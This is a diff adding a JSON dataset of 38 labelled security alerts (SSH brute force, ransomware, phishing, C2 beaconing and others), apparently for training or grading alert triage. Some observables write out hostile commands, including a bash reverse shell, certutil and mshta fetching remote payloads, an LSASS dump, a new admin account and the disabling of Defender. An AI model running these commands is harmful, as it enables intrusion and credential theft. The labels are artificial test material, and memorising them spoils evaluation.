@@ -1,0 +1,565 @@
+[
+  {
+    "alert": {
+      "id": "A-0001",
+      "title": "Repeated failed SSH logins from a single source",
+      "description": "412 failed SSH authentications for user root within 6 minutes from one external host against an internet-facing server.",
+      "source": "Suricata IDS",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T03:14:07Z",
+      "observables": { "ips": ["203.0.113.45"], "users": ["root"], "hosts": ["web-prod-01"] },
+      "raw": { "failed_attempts": 412, "protocol": "ssh", "window_seconds": 360 }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1110", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0002",
+      "title": "Successful login following a brute-force burst",
+      "description": "A successful authentication for svc-billing arrived immediately after 200+ failures from the same IP, indicating a likely brute-force compromise.",
+      "source": "Splunk SIEM",
+      "severity_reported": "critical",
+      "timestamp": "2026-05-28T04:51:33Z",
+      "observables": { "ips": ["203.0.113.45"], "users": ["svc-billing"], "hosts": ["app-prod-07"] },
+      "raw": { "preceding_failures": 233, "auth_result": "success" }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1110", "recommended_action": "escalate" }
+  },
+  {
+    "alert": {
+      "id": "A-0003",
+      "title": "Encoded PowerShell spawned by Microsoft Word",
+      "description": "winword.exe spawned powershell.exe with a base64 -EncodedCommand that decodes to a downloader stub.",
+      "source": "CrowdStrike EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-27T13:02:55Z",
+      "observables": {
+        "hosts": ["FIN-WS-118"],
+        "users": ["m.reyes"],
+        "processes": ["winword.exe", "powershell.exe"],
+        "command_lines": ["powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo..."]
+      },
+      "raw": { "parent": "winword.exe", "integrity_level": "medium" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1059.001", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0004",
+      "title": "Impossible travel for corporate user",
+      "description": "User signed in from New York and Singapore within 40 minutes; geovelocity is physically impossible.",
+      "source": "Okta",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-26T09:20:11Z",
+      "observables": { "ips": ["198.51.100.23", "203.0.113.210"], "users": ["a.kapoor"] },
+      "raw": { "geo_a": "US-NY", "geo_b": "SG", "minutes_between": 40 }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1078", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0005",
+      "title": "Phishing email with macro-enabled attachment delivered",
+      "description": "Inbound mail from a look-alike domain carried an .xlsm attachment with an auto-executing macro; delivered to three mailboxes.",
+      "source": "Proofpoint Email Gateway",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-25T15:44:02Z",
+      "observables": {
+        "domains": ["accounts-payable-support.com"],
+        "users": ["ap.team@corp.example"],
+        "file_hashes": ["9f1c2e7a4b8d6f0a3c5e9b1d7f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a"]
+      },
+      "raw": { "recipients": 3, "attachment_type": "xlsm", "sender_spf": "fail" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1566.001", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0006",
+      "title": "Mass file rename to .locked extension",
+      "description": "A single process renamed 4,200 files to .locked across a file share and dropped READ_ME_RANSOM.txt in every directory.",
+      "source": "Microsoft Defender EDR",
+      "severity_reported": "critical",
+      "timestamp": "2026-05-29T01:07:48Z",
+      "observables": {
+        "hosts": ["FS-CORP-02"],
+        "processes": ["svch0st.exe"],
+        "file_hashes": ["1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b"]
+      },
+      "raw": { "files_affected": 4200, "ransom_note": "READ_ME_RANSOM.txt" }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1486", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0007",
+      "title": "LSASS memory accessed by non-system process",
+      "description": "procdump64.exe opened a handle to lsass.exe with PROCESS_VM_READ, consistent with credential dumping.",
+      "source": "CrowdStrike EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T22:11:09Z",
+      "observables": {
+        "hosts": ["DC-01"],
+        "users": ["svc-backup"],
+        "processes": ["procdump64.exe", "lsass.exe"],
+        "command_lines": ["procdump64.exe -ma lsass.exe c:\\\\temp\\\\out.dmp"]
+      },
+      "raw": { "access_mask": "0x1010", "target": "lsass.exe" }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1003.001", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0008",
+      "title": "Outbound DNS tunneling pattern detected",
+      "description": "A host issued thousands of TXT queries with high-entropy subdomains to a single second-level domain over one hour.",
+      "source": "Zeek",
+      "severity_reported": "high",
+      "timestamp": "2026-05-27T18:33:50Z",
+      "observables": { "domains": ["x7f3q9.exfil-data.net"], "hosts": ["MKT-WS-244"] },
+      "raw": { "query_type": "TXT", "qcount": 5120, "avg_label_entropy": 4.7 }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1071.004", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0009",
+      "title": "certutil downloading a remote payload",
+      "description": "certutil.exe invoked with -urlcache to fetch an executable from an external IP, a common living-off-the-land download technique.",
+      "source": "Microsoft Defender EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T11:26:14Z",
+      "observables": {
+        "hosts": ["HR-WS-051"],
+        "processes": ["certutil.exe"],
+        "command_lines": ["certutil.exe -urlcache -split -f http://198.51.100.77/a.exe a.exe"],
+        "ips": ["198.51.100.77"]
+      },
+      "raw": { "downloaded": "a.exe" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1105", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0010",
+      "title": "New scheduled task created with hidden window",
+      "description": "schtasks.exe created a task that launches a script every 10 minutes with a hidden window, suggesting persistence.",
+      "source": "Windows Security Log",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-26T20:05:41Z",
+      "observables": {
+        "hosts": ["ENG-WS-309"],
+        "users": ["t.osei"],
+        "command_lines": ["schtasks /create /sc minute /mo 10 /tn Updater /tr \"powershell -w hidden -f c:\\\\u.ps1\""]
+      },
+      "raw": { "task_name": "Updater", "trigger": "every 10 minutes" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1053.005", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0011",
+      "title": "Internal host scanning multiple subnets",
+      "description": "A workstation connected to port 445 across 1,800 internal hosts in minutes, indicating network reconnaissance.",
+      "source": "Palo Alto Firewall",
+      "severity_reported": "low",
+      "timestamp": "2026-05-27T10:48:23Z",
+      "observables": { "ips": ["10.20.4.88"], "hosts": ["SALES-WS-077"] },
+      "raw": { "distinct_dst": 1800, "dst_port": 445 }
+    },
+    "label": { "severity": "medium", "mitre_technique_id": "T1046", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0012",
+      "title": "IDS alarms from authorized vulnerability scanner",
+      "description": "Suricata raised hundreds of exploit signatures, all sourced from the approved Nessus scanner during its scheduled weekly scan window.",
+      "source": "Suricata IDS",
+      "severity_reported": "high",
+      "timestamp": "2026-05-24T02:00:12Z",
+      "observables": { "ips": ["10.10.0.5"], "hosts": ["nessus-scanner-01"] },
+      "raw": { "source_is_known_scanner": true, "scan_window": "Sun 02:00-04:00" }
+    },
+    "label": { "severity": "informational", "mitre_technique_id": "T1046", "recommended_action": "close_false_positive" }
+  },
+  {
+    "alert": {
+      "id": "A-0013",
+      "title": "Encoded PowerShell from an administrator during change window",
+      "description": "Encoded PowerShell ran on a server, but the user is a domain admin executing an approved deployment inside an open change ticket.",
+      "source": "CrowdStrike EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-23T22:31:00Z",
+      "observables": {
+        "hosts": ["APP-PROD-03"],
+        "users": ["adm.deploy"],
+        "processes": ["powershell.exe"],
+        "command_lines": ["powershell.exe -enc <deployment-script>"]
+      },
+      "raw": { "change_ticket": "CHG-44821", "user_role": "domain_admin", "within_change_window": true }
+    },
+    "label": { "severity": "low", "mitre_technique_id": "T1059.001", "recommended_action": "close_false_positive" }
+  },
+  {
+    "alert": {
+      "id": "A-0014",
+      "title": "AWS root account used from an unfamiliar IP",
+      "description": "The AWS account root user performed console actions from an IP never seen before; root usage is against policy.",
+      "source": "AWS CloudTrail",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T06:12:40Z",
+      "observables": { "ips": ["203.0.113.9"], "users": ["root"] },
+      "raw": { "event": "ConsoleLogin", "mfa_used": false, "account": "1129-prod" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1078", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0015",
+      "title": "Large anomalous S3 egress to external destination",
+      "description": "An IAM user pulled 240 GB from a sensitive S3 bucket to an external IP over two hours, far above baseline.",
+      "source": "AWS GuardDuty",
+      "severity_reported": "high",
+      "timestamp": "2026-05-29T03:55:18Z",
+      "observables": { "ips": ["198.51.100.140"], "users": ["iam:datasci-batch"] },
+      "raw": { "bucket": "corp-pii-archive", "egress_gb": 240, "baseline_gb": 3 }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1048", "recommended_action": "escalate" }
+  },
+  {
+    "alert": {
+      "id": "A-0016",
+      "title": "Microsoft Defender real-time protection disabled",
+      "description": "Set-MpPreference was used to disable real-time monitoring on an endpoint shortly before other suspicious activity.",
+      "source": "Microsoft Defender EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T14:09:27Z",
+      "observables": {
+        "hosts": ["ENG-WS-211"],
+        "users": ["d.fischer"],
+        "command_lines": ["powershell Set-MpPreference -DisableRealtimeMonitoring $true"]
+      },
+      "raw": { "setting": "DisableRealtimeMonitoring", "value": true }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1562.001", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0017",
+      "title": "New local administrator account created",
+      "description": "net user created a local account and added it to the Administrators group on a workstation outside IT provisioning.",
+      "source": "Windows Security Log",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-27T23:40:05Z",
+      "observables": {
+        "hosts": ["LAB-WS-004"],
+        "command_lines": ["net user helpdesk_svc P@ssw0rd! /add", "net localgroup Administrators helpdesk_svc /add"]
+      },
+      "raw": { "new_account": "helpdesk_svc", "group": "Administrators" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1136", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0018",
+      "title": "User added to Domain Admins group",
+      "description": "A standard account was added to Domain Admins outside any change ticket, granting domain-wide privilege.",
+      "source": "Windows Security Log",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T17:22:31Z",
+      "observables": { "hosts": ["DC-02"], "users": ["j.lambert"] },
+      "raw": { "group": "Domain Admins", "added_by": "j.lambert", "change_ticket": null }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1098", "recommended_action": "escalate" }
+  },
+  {
+    "alert": {
+      "id": "A-0019",
+      "title": "Cryptominer process xmrig detected",
+      "description": "An EDR signature flagged xmrig executing with a mining pool argument, consuming sustained 100% CPU.",
+      "source": "SentinelOne EDR",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-26T12:15:59Z",
+      "observables": {
+        "hosts": ["BUILD-AGENT-12"],
+        "processes": ["xmrig"],
+        "domains": ["pool.minexmr.example"]
+      },
+      "raw": { "cpu_percent": 100, "pool": "pool.minexmr.example" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1496", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0020",
+      "title": "RDP login from a foreign IP to a server",
+      "description": "An interactive RDP session to a production server originated from an IP geolocated outside any office or VPN range.",
+      "source": "Splunk SIEM",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-27T05:18:44Z",
+      "observables": { "ips": ["203.0.113.188"], "users": ["b.nguyen"], "hosts": ["APP-PROD-09"] },
+      "raw": { "logon_type": 10, "geo": "RO" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1021.001", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0021",
+      "title": "SQL injection attempt against public web application",
+      "description": "IDS matched UNION-based SQL injection payloads in URI parameters against the public storefront.",
+      "source": "Suricata IDS",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T08:41:12Z",
+      "observables": { "ips": ["198.51.100.205"], "hosts": ["shop-edge-01"] },
+      "raw": { "uri": "/product?id=1%20UNION%20SELECT", "rule": "SQLi-UNION" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1190", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0022",
+      "title": "Web shell written to web root after exploit",
+      "description": "A new .aspx file with eval/exec patterns appeared in the web root moments after an exploit attempt; subsequent requests executed commands.",
+      "source": "CrowdStrike EDR",
+      "severity_reported": "critical",
+      "timestamp": "2026-05-28T08:49:55Z",
+      "observables": {
+        "hosts": ["shop-edge-01"],
+        "file_hashes": ["c0ffee11deadbeef22cafe33babe44f00d55ba5e66c0de77fa11ce88da7a99b0"],
+        "processes": ["w3wp.exe", "cmd.exe"]
+      },
+      "raw": { "path": "C:\\\\inetpub\\\\wwwroot\\\\status.aspx" }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1190", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0023",
+      "title": "Periodic beaconing to a known C2 domain",
+      "description": "A host made regular, jittered HTTPS connections to a domain on the threat-intel C2 list every 60 seconds.",
+      "source": "Palo Alto Firewall",
+      "severity_reported": "high",
+      "timestamp": "2026-05-29T00:30:02Z",
+      "observables": { "domains": ["cdn-update-sync.net"], "hosts": ["FIN-WS-118"], "ips": ["203.0.113.99"] },
+      "raw": { "interval_seconds": 60, "ti_match": "c2_known" }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1071", "recommended_action": "escalate" }
+  },
+  {
+    "alert": {
+      "id": "A-0024",
+      "title": "Mimikatz signature detected on host",
+      "description": "Antivirus matched a Mimikatz signature in memory on a domain controller, indicating active credential theft tooling.",
+      "source": "Microsoft Defender EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T22:14:40Z",
+      "observables": {
+        "hosts": ["DC-01"],
+        "file_hashes": ["aa11bb22cc33dd44ee55ff6677889900aabbccddeeff00112233445566778899"]
+      },
+      "raw": { "signature": "HackTool:Win32/Mimikatz" }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1003", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0025",
+      "title": "Process injection into explorer.exe",
+      "description": "A suspicious process used CreateRemoteThread to inject code into explorer.exe, a common defense-evasion technique.",
+      "source": "SentinelOne EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-27T19:58:36Z",
+      "observables": { "hosts": ["MKT-WS-244"], "processes": ["rundll32.exe", "explorer.exe"] },
+      "raw": { "api": "CreateRemoteThread", "target": "explorer.exe" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1055", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0026",
+      "title": "User clicked a spearphishing link to a credential page",
+      "description": "Web proxy logged a click from a corporate user to a newly registered domain hosting a fake Microsoft 365 login.",
+      "source": "Zscaler Proxy",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-26T16:07:21Z",
+      "observables": { "domains": ["login-microsoftonline-secure.com"], "users": ["s.alvarez"] },
+      "raw": { "domain_age_days": 2, "category": "phishing" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1566.002", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0027",
+      "title": "Bulk upload of files to personal Dropbox",
+      "description": "DLP observed a user uploading 1.2 GB of documents to a personal Dropbox account against data-handling policy.",
+      "source": "Forcepoint DLP",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-25T11:39:48Z",
+      "observables": { "domains": ["dropbox.com"], "users": ["k.brennan"] },
+      "raw": { "upload_mb": 1200, "account_type": "personal" }
+    },
+    "label": { "severity": "medium", "mitre_technique_id": "T1567", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0028",
+      "title": "Reverse shell from a public web server",
+      "description": "A bash process on the web server opened an interactive socket to an external host via /dev/tcp, a classic reverse shell.",
+      "source": "auditd",
+      "severity_reported": "critical",
+      "timestamp": "2026-05-28T09:02:17Z",
+      "observables": {
+        "hosts": ["shop-edge-01"],
+        "processes": ["bash"],
+        "command_lines": ["bash -i >& /dev/tcp/198.51.100.205/4444 0>&1"],
+        "ips": ["198.51.100.205"]
+      },
+      "raw": { "remote_port": 4444 }
+    },
+    "label": { "severity": "critical", "mitre_technique_id": "T1059.004", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0029",
+      "title": "Registry Run key added for autostart",
+      "description": "A value was written to HKCU CurrentVersion Run pointing to a script in the user profile, establishing logon persistence.",
+      "source": "Microsoft Defender EDR",
+      "severity_reported": "low",
+      "timestamp": "2026-05-27T07:51:33Z",
+      "observables": {
+        "hosts": ["ENG-WS-309"],
+        "command_lines": ["reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Sync /d c:\\\\users\\\\public\\\\s.vbs"]
+      },
+      "raw": { "hive": "HKCU", "value_name": "Sync" }
+    },
+    "label": { "severity": "medium", "mitre_technique_id": "T1547", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0030",
+      "title": "DNS request to a newly registered domain",
+      "description": "A single low-volume DNS lookup resolved a domain registered yesterday; no follow-on traffic observed yet.",
+      "source": "Cisco Umbrella",
+      "severity_reported": "low",
+      "timestamp": "2026-05-26T13:12:04Z",
+      "observables": { "domains": ["promo-deals-today.info"], "hosts": ["SALES-WS-077"] },
+      "raw": { "domain_age_days": 1, "request_count": 1 }
+    },
+    "label": { "severity": "low", "mitre_technique_id": "T1071.004", "recommended_action": "monitor" }
+  },
+  {
+    "alert": {
+      "id": "A-0031",
+      "title": "Failed login spike ending in account lockout",
+      "description": "A burst of failed logins for one user triggered an automatic lockout; no successful authentication occurred and the source is an internal misconfigured service.",
+      "source": "Splunk SIEM",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-24T08:25:50Z",
+      "observables": { "users": ["svc-reports"], "hosts": ["RPT-APP-01"] },
+      "raw": { "failed_attempts": 28, "result": "lockout", "source": "internal_service_misconfig" }
+    },
+    "label": { "severity": "low", "mitre_technique_id": "T1110", "recommended_action": "monitor" }
+  },
+  {
+    "alert": {
+      "id": "A-0032",
+      "title": "Vendor RDP session via approved jump host",
+      "description": "An RDP login flagged as unusual was a contracted vendor connecting through the sanctioned jump host during an approved maintenance window.",
+      "source": "Splunk SIEM",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-23T14:03:29Z",
+      "observables": { "ips": ["10.50.0.9"], "users": ["vendor.acme"], "hosts": ["JUMP-01"] },
+      "raw": { "approved_window": true, "vendor_contract": "VC-2210", "via": "JUMP-01" }
+    },
+    "label": { "severity": "informational", "mitre_technique_id": "T1021.001", "recommended_action": "close_false_positive" }
+  },
+  {
+    "alert": {
+      "id": "A-0033",
+      "title": "Obfuscated JScript dropper executed",
+      "description": "wscript.exe ran a heavily obfuscated .js file that reconstructs and launches a second-stage payload.",
+      "source": "CrowdStrike EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T10:36:48Z",
+      "observables": {
+        "hosts": ["HR-WS-051"],
+        "processes": ["wscript.exe"],
+        "file_hashes": ["dec0de00ab12cd34ef56ab78cd90ef12ab34cd56ef78ab90cd12ef34ab56cd78"]
+      },
+      "raw": { "obfuscation": "char-code + concat", "stage": "dropper" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1027", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0034",
+      "title": "VPN login from a new geography",
+      "description": "An employee connected to the corporate VPN from a country not previously seen for that account; credentials valid and MFA satisfied.",
+      "source": "Cisco AnyConnect VPN",
+      "severity_reported": "low",
+      "timestamp": "2026-05-25T20:59:13Z",
+      "observables": { "ips": ["203.0.113.221"], "users": ["p.santos"] },
+      "raw": { "mfa": "passed", "new_geo": "PT" }
+    },
+    "label": { "severity": "medium", "mitre_technique_id": "T1133", "recommended_action": "investigate" }
+  },
+  {
+    "alert": {
+      "id": "A-0035",
+      "title": "Lateral movement via PsExec between workstations",
+      "description": "PsExec created a service on a remote workstation over SMB using a privileged account, moving laterally inside the LAN.",
+      "source": "Microsoft Defender EDR",
+      "severity_reported": "high",
+      "timestamp": "2026-05-28T21:05:36Z",
+      "observables": {
+        "hosts": ["ENG-WS-211", "ENG-WS-309"],
+        "users": ["adm.helpdesk"],
+        "processes": ["PSEXESVC.exe"]
+      },
+      "raw": { "src": "ENG-WS-211", "dst": "ENG-WS-309", "transport": "smb" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1021", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0036",
+      "title": "User-reported phishing email, no interaction",
+      "description": "An employee reported a suspicious email via the report button; it was quarantined and there is no evidence anyone clicked or replied.",
+      "source": "Proofpoint Email Gateway",
+      "severity_reported": "low",
+      "timestamp": "2026-05-24T17:48:00Z",
+      "observables": { "domains": ["secure-billing-update.co"], "users": ["reporter@corp.example"] },
+      "raw": { "user_reported": true, "interaction": "none", "quarantined": true }
+    },
+    "label": { "severity": "low", "mitre_technique_id": "T1566", "recommended_action": "monitor" }
+  },
+  {
+    "alert": {
+      "id": "A-0037",
+      "title": "EC2 instance querying a crypto-mining pool",
+      "description": "GuardDuty flagged an EC2 instance resolving and connecting to a known cryptocurrency mining pool, indicating resource hijacking.",
+      "source": "AWS GuardDuty",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-27T02:44:19Z",
+      "observables": { "domains": ["xmr.pool-mine.example"], "hosts": ["i-0ab12cd34ef567890"] },
+      "raw": { "finding": "CryptoCurrency:EC2/BitcoinTool.B!DNS" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1496", "recommended_action": "contain" }
+  },
+  {
+    "alert": {
+      "id": "A-0038",
+      "title": "Scheduled task launches mshta with remote script",
+      "description": "A scheduled task was configured to run mshta.exe against a remote HTA, abusing a signed binary to execute attacker code.",
+      "source": "Windows Security Log",
+      "severity_reported": "medium",
+      "timestamp": "2026-05-28T03:59:27Z",
+      "observables": {
+        "hosts": ["LAB-WS-004"],
+        "command_lines": ["schtasks /create /tn Maint /tr \"mshta http://198.51.100.31/p.hta\" /sc onlogon"]
+      },
+      "raw": { "lolbin": "mshta.exe", "remote": "http://198.51.100.31/p.hta" }
+    },
+    "label": { "severity": "high", "mitre_technique_id": "T1053", "recommended_action": "investigate" }
+  }
+]
